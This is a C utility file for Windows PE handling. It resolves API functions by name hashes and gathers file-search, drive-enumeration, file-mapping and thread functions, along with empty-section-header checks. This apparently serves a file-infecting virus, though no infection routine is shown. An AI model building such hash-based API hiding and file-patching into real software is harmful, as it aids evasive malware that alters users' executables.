#include "utility.h"

void memdump(uint8_t *start, uint8_t *end) {
  PRINT_DEBUG("memdump:");
  uint32_t i = 0;
  while (start <= end) {
    if ((uint32_t)i % 16 == 0)
      PRINT_DEBUG("\n0x%X | ", (unsigned int)start);
    else if ((uint32_t)i % 8 == 0)
      PRINT_DEBUG(" ");
    PRINT_DEBUG("%02X ", (unsigned int)*start);
    start++;
    i++;
  }
  PRINT_DEBUG("\n");
}

IMAGE_NT_HEADERS* get_nt_header(void* base) {
  return (IMAGE_NT_HEADERS*) ((uint8_t*)base + *((uint8_t*)base + 0x3C));
}

IMAGE_EXPORT_DIRECTORY* get_export_directory(void* base, IMAGE_NT_HEADERS* ntHdr) {
    return (IMAGE_EXPORT_DIRECTORY*) ((uint8_t*)base + ntHdr->OptionalHeader.DataDirectory[0].VirtualAddress);
}

void* get_address_by_checksum(IMAGE_EXPORT_DIRECTORY* ed, void* base, uint32_t cs) {
  uint32_t* namePtr = (uint32_t*) ((uint8_t*)base + ed->AddressOfNames);
  uint32_t* addrPtr = (uint32_t*) ((uint8_t*)base + ed->AddressOfFunctions);
  uint16_t* nameOrdinalsPtr = (uint16_t*) ((uint8_t*)base + ed->AddressOfNameOrdinals);

  for(uint32_t i = 0; i < ed->NumberOfNames; i++) {
    PRINT_DEBUG(">>%s\n", (uint8_t*)base + *namePtr);

    if (checksum((const char*) base + *namePtr) == cs) {
      return (void*) ((uint8_t*)base + *(addrPtr + *nameOrdinalsPtr));
    }

    namePtr++;
    nameOrdinalsPtr++;
  }
  return NULL;
}

int fill_addresses(IMAGE_EXPORT_DIRECTORY* ed, void* base, functions_t* functions) {
  uint32_t* namePtr = (uint32_t*) ((uint8_t*)base + ed->AddressOfNames);
  uint32_t* addrPtr = (uint32_t*) ((uint8_t*)base + ed->AddressOfFunctions);
  uint16_t* nameOrdinalsPtr = (uint16_t*) ((uint8_t*)base + ed->AddressOfNameOrdinals);
  int functionCounter = 0;

  memset(functions, 0, sizeof(functions_t));

  for(uint32_t i = 0; i < ed->NumberOfNames; i++) {

    switch(checksum((const char*) base + *namePtr)) {
      case CS_EXITPROCESS:  functions->exitProcess = (fpExitProcess*) base + *(addrPtr + *nameOrdinalsPtr);
                            break;
      case CS_GETTICKCOUNT: functions->getTickCount = (fpGetTickCount*) base + *(addrPtr + *nameOrdinalsPtr);
                            break;
      case CS_GETPROCESSHEAP: functions->getProcessHeap = (fpGetProcessHeap*) base + *(addrPtr + *nameOrdinalsPtr);
                            break;
      case CS_HEAPALLOC: functions->heapAlloc = (fpHeapAlloc*) base + *(addrPtr + *nameOrdinalsPtr);
                            break;
      case CS_HEAPFREE: functions->heapFree = (fpHeapFree*) base + *(addrPtr + *nameOrdinalsPtr);
                            break;
      case CS_FINDFIRSTFILEA:  functions->findFirstFileA = (fpFindFirstFileA*) base + *(addrPtr + *nameOrdinalsPtr);
                            break;
      case CS_FINDNEXTFILEA: functions->findNextFileA = (fpFindNextFileA*) base + *(addrPtr + *nameOrdinalsPtr);
                            break;
      case CS_FINDCLOSE: functions->findClose = (fpFindClose*) base + *(addrPtr + *nameOrdinalsPtr);
                            break;
      case CS_CREATEFILEA: functions->createFileA = (fpCreateFileA*) base + *(addrPtr + *nameOrdinalsPtr);
                            break;
      case CS_GETFILESIZE: functions->getFileSize = (fpGetFileSize*) base + *(addrPtr + *nameOrdinalsPtr);
                            break;
      case CS_CREATEFILEMAPPINGA:  functions->createFileMappingA = (fpCreateFileMappingA*) base + *(addrPtr + *nameOrdinalsPtr);
                            break;
      case CS_MAPVIEWOFFILE: functions->mapViewOfFile = (fpMapViewOfFile*) base + *(addrPtr + *nameOrdinalsPtr);
                            break;
      case CS_FLUSHVIEWOFFILE: functions->flushViewOfFile = (fpFlushViewOfFile*) base + *(addrPtr + *nameOrdinalsPtr);
                            break;
      case CS_UNMAPVIEWOFFILE: functions->unmapViewOfFile = (fpUnmapViewOfFile*) base + *(addrPtr + *nameOrdinalsPtr);
                            break;
      case CS_SETFILEPOINTER: functions->setFilePointer = (fpSetFilePointer*) base + *(addrPtr + *nameOrdinalsPtr);
                            break;
      case CS_SETENDOFFILE:  functions->setEndOfFile = (fpSetEndOfFile*) base + *(addrPtr + *nameOrdinalsPtr);
                            break;
      case CS_CLOSEHANDLE: functions->closeHandle = (fpCloseHandle*) base + *(addrPtr + *nameOrdinalsPtr);
                            break;
      //case CS_COPYMEMORY: functions->copyMemory = (fpCopyMemory*) base + *(addrPtr + *nameOrdinalsPtr);
      //                      break;
      case CS_CREATETHREAD: functions->createThread = (fpCreateThread*) base + *(addrPtr + *nameOrdinalsPtr);
                            break;
      case CS_GETLOGICALDRIVES: functions->getLogicalDrives = (fpGetLogicalDrives*) base + *(addrPtr + *nameOrdinalsPtr);
                            break;
      case CS_SLEEP: functions->sleep = (fpSleep*) base + *(addrPtr + *nameOrdinalsPtr);
                            break;
      default:              functionCounter--;
                            break;
    }
    functionCounter++;
    namePtr++;
    nameOrdinalsPtr++;
  }
  return functionCounter;
}

int is_section_header_empty(IMAGE_SECTION_HEADER* sectionHeader) {
  for(uint32_t *ptr = (uint32_t*)sectionHeader; (IMAGE_SECTION_HEADER*)ptr < sectionHeader + 1; ptr++) {
    if(*ptr != 0)
      return 0;
  }
  return 1;
}

void memzero(void* start, uint32_t size) {
  for(uint8_t* ptr = start; ptr < (uint8_t*)start + size; ptr++)
    *ptr = 0;
}

void memcp(void* src, void* dest, uint32_t size) {
  for(uint32_t i = 0; i < size; i++) {
    ((uint8_t*)dest)[i] = ((uint8_t*)src)[i];
  }
}
